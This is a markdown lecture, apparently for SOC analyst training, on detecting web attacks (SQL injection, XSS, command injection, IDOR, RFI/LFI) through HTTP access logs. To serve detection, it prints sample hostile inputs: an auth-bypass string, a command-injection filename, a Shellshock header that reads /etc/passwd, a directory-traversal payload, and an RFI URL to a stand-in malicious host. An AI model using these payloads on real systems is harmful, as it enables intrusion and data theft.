# 📘 Lecture 5: Detecting Web Attacks

---

## 1) Introduction

## 📌 Overview

What Are Web Attacks?
- **Concept:** Web applications provide services to users through a web browser interface (e.g., Google, Facebook, and YouTube web versions).
- **Significance:** They serve as the direct interface to the internet for most organizations.
- **Key Statistic:** An Acunetix study shows that **75% of all cyber attacks** target the web application layer.
- **Consequences:** Attackers can exploit them to gain device access, steal sensitive personal data, disrupt services, and cause severe financial damage.

---

## Core Types of Web Attacks
- **SQL Injection (SQLi):** Injecting malicious SQL queries to manipulate, modify, or extract data from the database.
- **Cross-Site Scripting (XSS):** Injecting malicious scripts (predominantly JavaScript) that execute in the victim's browser.
- **Command Injection:** Injecting arbitrary operating system commands through the web app to be executed on the host server.
- **IDOR (Insecure Direct Object References):** An access control vulnerability allowing unauthorized access to objects by modifying user-supplied identifiers (IDs).
- **RFI & LFI (Remote/Local File Inclusion):** Exploiting dynamic file inclusion functions to read local system files (LFI) or execute remote malicious files (RFI).
- **File Upload (Web Shell):** Uploading unauthorized malicious executable files to compromise and gain remote administrative control of the server.

---

## Course Learning Objectives
- Master the underlying mechanisms and classifications of major web vulnerabilities (SQL Injection, Command Injection, IDOR, etc.).
- Understand the technical reasoning and motivation behind why attackers select specific attack methods.
- Develop practical skills to recognize, analyze, and detect web attack indicators in real-world environments.

  ---

## 2) Why Detecting Web Attacks Important

```
If we examine the anatomy of an attack, we can clearly see that 
the best scenario is to prevent the attack in its first phase. This is why there are various 
security measures aimed at preventing and detecting threats 
against web applications (WAF, IPS, SIEM rules...).
```
---


## 3) OWASP Overview

- **Definition:** The Open Worldwide Application Security Project (OWASP) is a non-profit foundation dedicated to improving software security.
- **Significance:** It serves as one of the world's most reputable and authoritative resources for web application security.

---

## OWASP Top 10
- Periodically every few years, OWASP releases a list identifying the ten most critical security risks facing web applications.
- The 2021 OWASP Top 10 list includes:
  1. **Broken Access Control:** Failures in enforcing permissions, allowing unauthorized access or privilege escalation.
  2. **Cryptographic Failures:** Flaws related to cryptography, exposing sensitive data due to weak or missing encryption.
  3. **Injection:** Injection flaws where hostile data is sent to an interpreter (e.g., SQLi, Command Injection, LDAP Injection).
  4. **Insecure Design:** Flaws resulting from missing or ineffective security design and architectural patterns.
  5. **Security Misconfiguration:** Improperly configured security controls, default passwords, or overly permissive settings.
  6. **Vulnerable and Outdated Components:** Risks from using unpatched, unsupported, or legacy third-party libraries and dependencies.
  7. **Identification and Authentication Failures:** Flaws in validating user identity, authentication mechanisms, or session management.
  8. **Software and Data Integrity Failures:** Code and infrastructure that do not protect against integrity violations (e.g., untrusted plugins or unverified CI/CD pipelines).
  9. **Security Logging and Monitoring Failures:** Insufficient logging, monitoring, and alerting, leaving attacks undetected in real time.
  10. **Server-Side Request Forgery (SSRF):** A vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an unintended destination.
---

## 4) How Web Applications Work
# Web Application Architecture & The HTTP Protocol

## Overview of the HTTP Protocol
- **Communication Model:** Client-Server architecture; the client sends an HTTP request, and the web server returns an HTTP response.
- **Network Layer:** Operates at the application layer (**Layer 7 - Application**) of the OSI model, on top of underlying protocols such as Ethernet, IP, TCP, and SSL/TLS.

<img width="528" height="368" alt="image" src="https://github.com/user-attachments/assets/cf4b3cb2-288d-4eb8-b6f5-2d1cc295a3e1" />


---

## HTTP Request Structure
Consists of three main components, with an empty line separating the headers from the body:

<img width="817" height="173" alt="image" src="https://github.com/user-attachments/assets/568f299a-373d-48e6-be63-151c1d6ebd49" />


### Request Line
- **HTTP Method:** Standard methods such as GET, POST, etc.
- **Requested Resource:** The path to the requested resource (e.g., `/` indicates the root/homepage).

### Key Request Headers
- `Host`: Specifies the domain name of the target web server.
- `User-Agent`: Details the client browser and operating system (frequently examined to identify automated vulnerability scanners).
- `Cookie`: Stores session state data, allowing users to remain logged in without re-authenticating.
- `Upgrade-Insecure-Requests`: Indicates client preference for an encrypted connection via SSL/HTTPS.
- `Accept`: Content types the client can process.
- `Accept-Encoding`: Compression algorithms supported by the client.
- `Accept-Language`: Preferred display language of the client.
- `Connection`: TCP connection management (`keep-alive` to maintain persistence or `close` to terminate after delivery).

### Request Message Body
- Contains payload data sent to the server (e.g., authentication credentials, form inputs, or upload parameters via POST).

---

## HTTP Response Structure
Composed of three core elements:

<img width="581" height="373" alt="image" src="https://github.com/user-attachments/assets/5a1ce59e-ada1-4d9d-9aef-3c254a04653c" />


### Status Line
Includes the HTTP protocol version and the response code (**Status Code**):
- `100 - 199`: Informational responses.
- `200 - 299`: Successful operations (e.g., `200 OK`).
- `300 - 399`: Redirection messages.
- `400 - 499`: Client errors (e.g., `403 Forbidden`, `404 Not Found`).
- `500 - 599`: Server errors (e.g., `500 Internal Server Error`).

### Common Response Headers
- `Date`: Timestamp indicating when the response was generated and sent.
- `Server`: Web server software version and underlying operating system (useful for reconnaissance analysis).
- `Last-Modified`: Last modification timestamp of the resource (utilized by caching mechanisms).
- `Content-Type`: MIME type of the returned payload (HTML, JSON, media streams, etc.).
- `Content-Length`: Size of the response payload in bytes.
- `Connection`: Network connection status directives.

### Response Body
- The actual resource returned by the server based on client demand (e.g., HTML source to render, API response datasets, raw files).
<img width="528" height="154" alt="image" src="https://github.com/user-attachments/assets/95a060df-f233-4bdb-802f-a5f9f7b9cae7" />

---

## 5) Detecting SQL Injection Attacks

## What is SQL Injection (SQLi) & Classifications
- **Definition:** A critical attack vector where a web application directly concatenates unsanitized user-supplied input into SQL queries.
- **Impact:**
  - Authentication bypass.
  - Operating system command execution (e.g., via `xp_cmdshell`).
  - Sensitive data exfiltration.
  - Creating, updating, or deleting database records.
- **Three Primary SQLi Categories:**
  - **In-band SQLi (Classic SQLi):** The attacker sends the query and receives the results or database errors over the same communication channel (HTTP response). It is the easiest to exploit.
  - **Inferential SQLi (Blind SQLi):** The application does not return data directly. The attacker reconstructs data by observing application behavior, such as true/false logic (Boolean-based) or response delays (Time-based).
  - **Out-of-band SQLi:** The database server sends exfiltrated data through a separate channel or protocol outside the application (e.g., DNS queries, HTTP callbacks).

<img width="1668" height="796" alt="image" src="https://github.com/user-attachments/assets/c1246700-462d-4e29-9588-6de8246840a7" />



---

## Identifying SQLi Payloads
- **Special Characters & Syntax:** Single quotes (`'`), SQL comment indicators (`-- -`, `#`), parentheses (`()`), and URL-encoded symbols (`%20`, `%27`).
- **SQL Keywords:** Look for terms such as `SELECT`, `UNION`, `INSERT`, `UPDATE`, `WHERE`, `AND`, `OR`, `CHR()`, and `CONVERT()`.
- **Classic Authentication Bypass Payload:** `' OR 1=1 -- -` (forces the query condition to evaluate to `True` regardless of input).
- **Inspection Vectors in HTTP Requests:**
  - URL query parameters (`GET` requests, e.g., `?id=1`).
  - Request message body (`POST` form data, JSON payloads).
  - HTTP request headers (`User-Agent`, `Referer`, `Cookie`).

---

## Detecting Automated Scanning Tools (e.g., Sqlmap)
When analyzing web server access logs, automated tools exhibit distinct patterns:
- **User-Agent String:** Often contains explicit tool identifiers or version numbers (e.g., `sqlmap/1.x`, `Nikto`) unless modified.
- **Request Frequency:** Exceptionally high volume in short time intervals (e.g., $>50$ requests per second, compared to $\approx 1$ request per second for normal users).
- **Payload Signature & Complexity:** Excessively complex nested payloads, or payloads explicitly embedding the tool name (e.g., `sqlmap' OR 1=1`).

---

## SOC Analyst Access Log Investigation Workflow
1. **URL Decoding:** Translate percent-encoded characters (`%27`, `%20`) to reveal the plaintext payload. *(Note: Never upload production logs containing sensitive corporate data to public third-party online decoders).*
2. **Identify Origin & Timeline:** Determine the attacker's client IP address and the exact timestamp when anomalous activity initiated.
3. **Evaluate Attack Outcome (Success vs. Failure):**
   - **HTTP Status Codes:** Examine response codes (`200 OK`, `302 Found`, `500 Internal Server Error`).
   - **Response Size:** Compare response payload sizes (Content-Length) across requests. A noticeable deviation in byte size often indicates successful data retrieval.
   - **Escalation:** Escalate suspicious or confirmed successful attacks to Tier 2 / Incident Response teams.
<img width="1744" height="767" alt="image" src="https://github.com/user-attachments/assets/0c84d394-30ed-4c31-a6f3-5e79295d05bb" />


---



## 6) Detecting Cross-Site Scripting (XSS) Attacks

## What is Cross-Site Scripting (XSS) & Its Nature
- **Definition:** An injection-based web vulnerability occurring when an application includes unsanitized user input directly into an HTTP response. This allows attackers to execute malicious scripts (primarily JavaScript) on the victim's browser.
- **Impact (Client-side but highly dangerous):**
  - **Session Hijacking:** Stealing session cookies (`document.cookie`).
  - **Credential Theft:** Capturing user login details and personal information.
  - **Malicious Redirection:** Forcing the browser to navigate to a malicious website (e.g., via `window.location`).

---

## Three Main Types of XSS
- **Reflected XSS (Non-Persistent):** The malicious payload is part of the HTTP request (usually in URL parameters). The server immediately reflects the payload back to the victim's browser without storing it in the database. It is the most common type.
- **Stored XSS (Persistent):** The attacker permanently injects the payload into the web application's database (e.g., via comments, forum posts, or profile fields). Anyone visiting the infected page will execute the malicious script. This is the **most dangerous** type.
- **DOM-Based XSS:** The attack payload is executed as a result of modifying the DOM "environment" directly in the victim's browser using legitimate client-side scripts. The payload may not even reach the back-end server.

---

## Identifying XSS Payloads in Requests & Logs
- **Special Characters:** Look for characters like `< > " ' / = ;` and their URL-encoded equivalents (e.g., `%3C`, `%3E`, `%22`, `%27`).
- **HTML Tags & JS Keywords:** Common indicators include `<script>`, `alert()`, `prompt()`, `console.log()`, `window.location`, `document.cookie`, `onerror=`, and `onload=`.
- **Defense Mechanisms:** Always use **HTML Encoding** on user data before rendering it to the interface. Utilize web frameworks properly and keep them updated to patch inherent vulnerabilities.

<img width="1337" height="617" alt="image" src="https://github.com/user-attachments/assets/46532b4b-169d-4615-933b-0d14e04447ef" />





---

## SOC Analyst Access Log Investigation Workflow
1. **URL Decoding:** Convert percent-encoded strings (`%XX`) back to plaintext to reveal and read the JavaScript payloads.
<img width="1149" height="678" alt="image" src="https://github.com/user-attachments/assets/3b6fa7cc-bfde-48c3-aa64-fc8b81e3e5ab" />

2. **Identify the Attack Vector:** Locate the specific parameter being targeted (e.g., the search parameter `?s=` in WordPress).
3. **Detect Automated Tools:**
   - **User-Agent:** Often reveals the name of the script library or vulnerability scanner (e.g., `Python-urllib`, `Nikto`, `sqlmap`).
   - **Request Frequency:** Automated tools send payloads at a highly consistent and rapid rate (e.g., one request every 3-4 seconds).
4. **Source IP Considerations:** If the web application is behind a proxy or CDN (like Cloudflare), the IP recorded in standard access logs might be the CDN's IP, not the actual attacker's IP. (Investigate headers like `X-Forwarded-For` if available).
5. **Evaluate Attack Success (Success vs. Fail):** You must review the HTTP Response Body to see if the script was successfully rendered or escaped. Without access to the response body, it is difficult to definitively confirm if the attack succeeded.

---

## 7) Detecting Command Injection Attacks

## Definition
Occurs when user input data is unsanitized and passed directly to the operating system shell. Attackers exploit this to execute commands directly on the operating system to take control of the system.

## Mechanism
Attackers use command separators (such as the `;` character) to inject malicious commands. 
- **Example:** Instead of entering a normal file name, the attacker enters `letsdefend;ls;.txt`. The operating system will sequentially run 3 commands: `cp letsdefend`, `ls` (directory listing), and `.txt`. 
- **Consequences:** The consequences can include shutting down the server (the `shutdown` command) or creating a reverse shell to infiltrate deeper into the system.

## Prevention Methods
- **Sanitize Input:** Always sanitize data received from users (never trust any input, including file names).
- **Limit User Privileges:** Set the web application's user rights to the lowest possible level, avoiding administrator privileges.
- **Isolation:** Use virtualization technologies such as Docker.

## Detection Methods (For SOC Analysts)
- **Check All Fields:** Examine all areas of the web request (as the vulnerability can exist in multiple locations).
- **Identify OS Commands:** Look for common terminal command keywords in the data received from the user, such as: `dir`, `ls`, `cp`, `cat`, `type`.
- **Recognize Payloads:** Familiarize yourself with commonly used Command Injection payloads (e.g., reverse shell payloads).

## Real-world Example (2014 Shellshock Vulnerability)
Attackers exploited a bash flaw to inject commands into unexpected HTTP Headers like the User-Agent (e.g., `User-Agent: () { :;}; echo "NS:" $(</etc/passwd)`) to exfiltrate system information.

---


## 8) Detecting Insecure Direct Object Reference (IDOR) Attacks

## Nature & Mechanism
- **Nature:** Occurs when a web application lacks proper authorization checks or implements loose access controls. IDOR ranks #1 in the 2021 OWASP Top 10 list (under the **Broken Access Control** category).
- **Mechanism:** Attackers manipulate parameters that directly reference objects (e.g., modifying `?id=1` to `?id=2` in the URL) to unauthorizedly view, modify, or delete other users' data.
- **Difference:** Unlike SQL Injection or XSS, IDOR does not rely on injecting special characters or malicious payloads; it directly exploits logical flaws in the application's authorization mechanism.

---

## Prevention Methods (For Developers)
- **Authorization Check:** Always verify whether the account making the request is authorized to access or modify the requested object.
- **Limit Direct Parameters:** Rely on user identification data stored in server-side Sessions rather than accepting direct identifiers (like an `id` parameter) supplied by the client.

---

## Detection & Log Analysis (For SOC Analysts)
Because IDOR attacks do not use obvious malicious payloads, detection relies primarily on analyzing anomalous behavior within Access Logs:
- **Check Request Volume:** Look for instances where a single IP address sends a high volume of requests to the same endpoint (e.g., `wp-admin/user-edit.php`) in a very short period.
- **Find Patterns:** Identify brute-force enumeration attempts by looking for parameters that change in a predictable, sequential numeric pattern (e.g., `user_id=1`, `user_id=2`, `user_id=3`).
- **Identify Automated Tools:** Inspect the `User-Agent` header for traces of automated vulnerability scanners or brute-forcing tools like `wfuzz` or `Burp Suite`.
- **Evaluate Attack Success:**
  - **Status Code:** HTTP codes like `302` (Redirect) or `403` (Forbidden) typically indicate that the application blocked the attempt (failed attack).
  - **Response Size:** If user data is successfully retrieved, the response sizes will generally vary due to different name lengths and data. If a massive number of requests return the exact same byte size (e.g., consistently 5691 bytes), it is likely returning a generic default or error page (indicating a failed attack).

---


## 9) Detecting RFI & LFI Attacks

## Nature & Classification
File Inclusion vulnerabilities occur when a web application includes a file based on user input without proper validation or sanitization.
- **LFI (Local File Inclusion):** The included file is located on the **same server** hosting the web application. Attackers typically use LFI to read sensitive system files (e.g., password files like `/etc/passwd`).
- **RFI (Remote File Inclusion):** The included file is hosted on a **remote server** controlled by the attacker. This allows the attacker to embed and execute malicious code directly on the target server.

## Mechanism & Sample Payloads
Attackers often exploit features that require a file path parameter (e.g., a language selector `?language=en`).
- **Directory Traversal:** Using the `../` string to navigate backward through parent directories until reaching the root directory.
- **Null Byte Injection:** Appending `%00` at the end of the payload to signal the end of the string. This forces the system to ignore any default file extensions appended by the application (e.g., `.php`).
- **Classic LFI Payload:** `?language=/../../../../../../../../../etc/passwd%00`

## Consequences (Impact)
- Disclosure of sensitive information.
- Executing code / Remote Code Execution (RCE).
- Denial of Service (DoS).

## Prevention Methods (For Developers)
- The most effective mitigation is to thoroughly sanitize and validate all data received from users before it is processed.
- Implement security controls on **both the client and server sides** (client-side controls alone can be easily bypassed by attackers).

## Detection & Log Analysis (For SOC Analysts)
- **Examine all parameters:** The vulnerability can exist in any field of the HTTP request.
- **LFI Indicators:** Look for special characters used for directory traversal, such as `/`, `.`, `\` (or their URL-encoded equivalents like `%2e%2e%2f`). Identify unauthorized access attempts to critical system files (e.g., `/etc/passwd` on Linux, `boot.ini` on Windows).
- **RFI Indicators:** Look for protocols such as `http://` or `https://` injected into URL parameters (e.g., `?page=http://malicious.com/shell.txt`), which indicates an attempt to fetch a file from an external server.

---





